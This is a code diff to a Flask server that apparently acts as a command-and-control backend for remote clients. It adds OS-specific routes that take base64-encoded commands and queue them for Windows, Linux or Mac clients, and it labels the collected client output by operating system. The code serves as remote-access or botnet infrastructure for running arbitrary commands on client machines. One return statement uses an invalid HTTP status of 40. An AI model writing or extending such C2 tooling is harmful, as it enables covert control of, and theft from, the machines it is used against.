@@ -15,6 +15,9 @@ app = Flask(__name__)
 current_command = {}
 client_output_log = {}  # Stores output per client
 
+os_map = {"win": "w", "lin": "l", "mac": "m", "w": "w", "l": "l", "m": "m"}
+os_fullname = {"w": "win", "l": "lin", "m": "mac"}
+
 if len(sys.argv) > 1:
     server_url = f"{sys.argv[1]}"
 else:
@@ -33,6 +36,23 @@ def set_cmd(b64):
         for cid in current_command.keys():
             current_command[cid] = decoded
         print(f"[+] Set command for all clients: {repr(decoded)}")
+        return "OK\n"
+    except Exception as e:
+        print(f"[!] Decode error: {e}")
+        return "ERROR\n", 400
+
+@app.route("/cmd/<os>/<b64>", methods=["GET"])
+def set_cmd_by_os(os, b64):
+    try:
+        if os not in ("w", "l", "m", "win", "lin", "mac"):
+            return "Invalid\n", 40
+        decoded = base64.b64decode(b64.encode()).decode()
+        os = os_map.get(os.lower())
+        target_os = os.lower()
+        for cid in current_command.keys():
+            if cid.startswith(target_os):
+                current_command[cid] = decoded
+        print(f"[+] Set command for {os_fullname[target_os].upper()} clients: {repr(decoded)}")
         return "OK\n"
     except Exception as e:
         print(f"[!] Decode error: {e}")
@@ -77,7 +97,8 @@ def view_output():
 
     output = ""
     for cid, log in client_output_log.items():
-        output += f"== Client {cid} ==\n{log}\n"
+        os_tag = cid.split("-")[0]
+        output += f"== Client {cid} - {os_fullname[os_tag].upper()} ==\n{log}\n"
     return Response(output.strip(), mimetype="text/plain")
 
 @app.route("/log/log.txt", methods=["GET"])
